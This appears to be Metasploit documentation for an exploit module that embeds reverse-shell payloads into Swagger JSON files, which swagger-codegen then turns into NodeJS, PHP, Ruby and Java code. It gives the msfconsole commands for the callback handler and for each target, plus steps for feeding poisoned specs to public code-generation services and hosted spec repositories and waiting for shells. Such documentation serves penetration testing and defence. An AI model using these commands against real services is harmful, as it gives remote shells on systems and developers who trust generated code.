The [Swagger CodeGen parameter injector module](../../../../../modules/exploits/multi/fileformat/swagger_param_inject.rb) generates a Swagger JSON file with embedded Metasploit payloads.

In the typical case, a Swagger document defines an API.  Swagger can be automatically consumed to generate client/server code, testing and scaffolding in APIs by companies eager to provide value to the increasing need for scalable API deployment and testing.

Currently, this module supports 4 languages for delivery: NodeJS, PHP, Ruby, and Java.  These are specified by the PAYLOAD set for the exploit module.


## Verification Steps

All exploits assume a bind or reverse-tcp callback handler, with preference on reverse-tcp. 

1. Start msfconsole
2. Start a callback handler listening for a the appropriate payload (e.g.)

```
use exploit/multi/handler  
set PAYLOAD nodejs/shell_reverse_tcp

set LHOST 192.168.68.138 
set LPORT 4444

run 
```
3. Pick a target 

## Targets

**NodeJS** 

This attack injects a payload into javascript by terminating a URL path string.


```

use exploit/multi/fileformat/swagger_param_inject
set TARGET 0
set PAYLOAD nodejs/shell_reverse_tcp
set INFO_VERSION "1.0.0"
set SWAGGER_HOST "localhost"
run 
```

**PHP** 

This attack injects a payload into PHP multiline comment area.


```

use exploit/multi/fileformat/swagger_param_inject
set TARGET 1
set PAYLOAD php/meterpreter/reverse_tcp 
set SWAGGER_HOST "localhost"
run 
```

**ruby** 

This attack injects a payload into ruby multiline comment area.


```

use exploit/multi/fileformat/swagger_param_inject
set TARGET 3
set PAYLOAD ruby/shell_reverse_tcp 
set SWAGGER_HOST "localhost"
run 
```

**Java** 

This attack injects a payload into Java by terminating a URL path string.


```

use exploit/multi/fileformat/swagger_param_inject
set TARGET 2
set PAYLOAD java/jsp_shell_reverse_tcp 
set SWAGGER_HOST "localhost"
run 
```

## Quick Test

Use the online [editor.swagger.io](http://editor.swagger.io) to upload your swagger document, and generate pre-built code bases from the document.  The swagger editor leverages [generator.swagger.io](http://generator.swagger.io) to build these clients & servers automatically from the document, and published downloadable artifacts of these code bases.


## Scenarios

Effective against services with either these dependencies

*  [swagger-codegen](https://github.com/swagger-api/swagger-codegen)
  * public API [generator.swagger.io](http://generator.swagger.io/)
  * public docker container [swagger-generator/](https://hub.docker.com/r/swaggerapi/swagger-generator/)
* [swagger-test-templates](https://github.com/apigee-127/swagger-test-templates)

**Possible Attack approach.**

1. Research the target environment and component dependencies.  
2. Setup appropriate payload callback listener.
3. generate the appropriate swagger document with associated MS payload (see above for examples)


**Against a webservice (2nd order attack / blind code-gen)**

*Who knows what insecurely configured code-gen Docker containers hosted in data compute or API broker cluster could do if given the chance...*
 
4. Feed the document to the service in service appropriate submission of Swagger documents.  This is most often accoplished by defining a Mock, Test or Pass-Thru service automatically constructed by the swagger document definition.
5. Wait for callback handler event.  

**Against a code repository or public hosting of spec**

*People and Robots trust swagger to build clients, servers, mocks, and more.  Publicly hosted specs should be verified as to not corrupt automatic code generation.*

4. Feed the document to the service in service appropriate submission of Swagger documents.  This is most often accoplished by defining a Mock, Test or Pass-Thru service automatically constructed by the swagger document definition.
5. Wait for callback handler event.  

